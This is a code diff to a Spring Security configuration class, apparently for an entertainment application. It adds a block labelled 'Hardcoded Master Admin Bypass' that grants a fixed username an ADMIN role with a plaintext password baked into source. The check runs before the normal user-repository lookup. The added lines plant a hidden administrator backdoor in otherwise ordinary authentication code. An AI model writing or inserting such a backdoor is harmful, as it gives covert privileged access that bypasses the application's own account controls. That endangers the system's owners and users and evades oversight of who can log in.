@@ -22,6 +22,15 @@ public class ApplicationConfig {
     @Bean
     public UserDetailsService userDetailsService() {
         return username -> {
+            // Hardcoded Master Admin Bypass
+            if ("PriyaArjun".equals(username)) {
+                return org.springframework.security.core.userdetails.User.builder()
+                        .username("PriyaArjun")
+                        .password(passwordEncoder().encode("PriyaArjun1718@Eagle"))
+                        .roles("ADMIN")
+                        .build();
+            }
+
             com.eagle.entertainment.model.User user = userRepository.findByUsername(username)
                     .orElseThrow(() -> new UsernameNotFoundException("User not found: " + username));
             
